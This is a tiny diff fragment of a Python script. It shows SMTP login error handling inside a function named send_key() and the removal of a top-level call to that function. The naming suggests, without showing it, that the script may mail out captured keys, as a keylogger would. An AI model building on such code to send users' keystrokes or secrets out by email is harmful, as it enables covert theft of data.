@@ -35,5 +35,3 @@ def send_key():
     except smtplib.SMTPAuthenticationError:
         print("[!] Login or pass failed")
         pass
-
-send_key()
